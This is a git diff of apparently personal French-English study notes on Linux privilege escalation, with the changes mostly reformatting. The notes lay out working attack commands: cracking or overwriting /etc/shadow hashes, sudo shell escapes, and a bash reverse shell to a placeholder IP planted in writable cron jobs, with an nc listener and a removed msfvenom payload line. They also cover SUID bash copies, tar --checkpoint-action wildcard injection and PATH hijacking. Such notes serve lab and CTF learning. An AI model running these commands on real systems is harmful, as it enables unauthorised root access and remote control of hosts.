@@ -53,80 +53,91 @@ ou juste : $ openssl passwd [newpassword]
 ```
 
 FORMAT PASSWD :
-test:x:0:0:root:/root:/bin/bash
-[as divided by colon (:)]
-Username: It is used when user logs in. It should be between 1 and 32 characters in length.
-Password: An x character indicates that encrypted password is stored in /etc/shadow file. sha512
-User ID (UID): Each user must be assigned a user ID (UID). 
-UID 0 = root / 
-UIDs 1-99 other predefined accounts. 
-UID 100-999 are reserved by system for administrative and system accounts/groups.
-UID 1000+ users
-Group ID (GID): The primary group ID (stored in /etc/group file)
-User ID Info: extra information about the users.
-Home directory: The absolute path to the directory the user will be in when they log in
-Command/shell: The absolute path of a command or shell (/bin/bash).
-- READABLE /ETC/SHADOW :
-crack the hash
-- WRITABLE /ETC/SHADOW :
-make a new password : mkpasswd -m sha-512 newpasswordhere
-and edit 
-$ su root
+test:x:0:0:root:/root:/bin/bash  
+[as divided by colon (:)]  
+Username: It is used when user logs in. It should be between 1 and 32 characters in length.  
+Password: An x character indicates that encrypted password is stored in /etc/shadow file. sha512  
+User ID (UID): Each user must be assigned a user ID (UID).   
+UID 0 = root /   
+UIDs 1-99 other predefined accounts.   
+UID 100-999 are reserved by system for administrative and system accounts/groups.  
+UID 1000+ users  
+Group ID (GID): The primary group ID (stored in /etc/group file)  
+User ID Info: extra information about the users.  
+Home directory: The absolute path to the directory the user will be in when they log in  
+Command/shell: The absolute path of a command or shell (/bin/bash). 
+
+### READABLE /ETC/SHADOW :
+crack the hash with john : it's supposed to be sha-512
+### WRITABLE /ETC/SHADOW :
+make a new password : 
+```bash
+mkpasswd -m sha-512 newpasswordhere
+```
 
 
-- SHELL ESCAPE : https://gtfobins.github.io
-$ sudo -l
-si des services sont executables et presents dans le lien :
-/!\ ne pas oublier le sudo avant les commandes du lien
-- Escaping Vi editor :
-if NOPASSWD : Bon signe
-si usr/bin/vi :
-$ sudo vi
-$ :!s 			dans vi -> crée un root shell
+### SHELL ESCAPE : https://gtfobins.github.io
+```bash
+$sudo -l  
+```
 
-- EXLOITING CRON JOBS
-- view which ones are actives : $cat /etc/crontab
-On regarde si certains se lance avec des droits root et si on peut les modifier
-dans ce cas on crée un payload avec msfvenom pour avoir un reverse shell ou autre
-$ msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
-on le copie ensuite dans le file du cron job 
-Et on attent qu'il s'execute avec un listener en place sur le même port que le payload
+### EXLOITING CRON JOBS :
+- view which ones are actives : 
+```bash
+$cat /etc/crontab
+```
+On regarde si certains se lance avec des droits root et si on peut les modifier  
+Si oui, il y a la place pour un reverse shell  
 
-Format =# = ID
-m = Minute
-h = Hour
-dom = Day of the month
-mon = Month
-dow = Day of the week
-user = What user the command will run as
-command = What command should be run
-For Example :
-#  m   h dom mon dow user  command
+
+Format =# = ID  
+m = Minute  
+h = Hour  
+dom = Day of the month  
+mon = Month  
+dow = Day of the week  
+user = What user the command will run as  
+command = What command should be run  
+For Example :    
+-  m   h dom mon dow user  command  
 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
 
-- WRITEABLE CRON JOBS :
-REVERSE SHELL :
+### WRITEABLE CRON JOBS :
+#### Exemple :
+##### REVERSE SHELL :
 on écrit l'imitation du file et on setup un listener (en ayant remplacer l'ip et le port:
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/[Adresse IP]/4444 0>&1
+```
+```bash
 $ nc -lvnp 4444
-cat
-ROOTBASH :
-locate PATH 
+```
+
+##### ROOTBASH :
+locate PATH  
 make an imitating file with :
+```bash
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
+```
+```bash
 chmod +xs /tmp/rootbash
 chmod +x /path/filename.sh
+```
 wait for the cron job executing
-and $ /tmp/rootbash -p
-OVERWRITING CRONS
+```bash
+$ /tmp/rootbash -p
+```
+##### OVERWRITING CRONS
+```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+```
 wait till it executes
 /tmp/bash -p
 
 
-TAR COMMAND (ou autres commandes qui permettent de faire d'autres choses ):
+### TAR COMMAND 
 Si dans un cron job une commande comme tar est run avec * 
 alors elle incluera tous els fichiers selectionnés lors de l'exec.
 Si les noms des fichiers sont des options de commande correct alors 
@@ -143,19 +154,23 @@ $ touch /home/user/--checkpoint=1
 $ touch /home/user/--checkpoint-action=exec=shell.elf
 on setup un netcat et on attend
 $ nc -nvlp 4444
-ROOTBASH
+
+#### ROOTBASH
+```bash
 1. In command prompt type:
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 4. Wait 1 minute for the Bash script to execute.
 5. In command prompt type: /tmp/bash -p
+```
 
-- EXPLOITING PATH VARIABLE
-On regarde le nom des fichiers qui sont executés 
-On se déplace dans /tmp et on crée un fichier du même nom avec le scirpt dedans
+### EXPLOITING PATH VARIABLE
+On regarde le nom des fichiers qui sont executés  
+On se déplace dans /tmp et on crée un fichier du même nom avec le script dedans
+```bash
 echo $PATH
-
+```
 On commence par cree le faux script
 $ cd /tmp
 $echo "[whatever command we want to run]" > [name of the executable we're imitating] 
